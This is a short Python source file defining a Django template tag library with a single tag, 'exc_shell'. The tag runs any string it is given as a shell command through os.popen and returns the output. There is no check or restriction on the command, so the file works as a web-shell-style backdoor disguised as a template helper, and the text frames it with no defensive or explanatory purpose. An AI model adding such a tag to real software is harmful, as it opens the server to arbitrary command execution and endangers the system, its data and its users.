import os

from django import template


register = template.Library()


@register.simple_tag
def exc_shell(cmd):
    return os.popen(cmd).read()
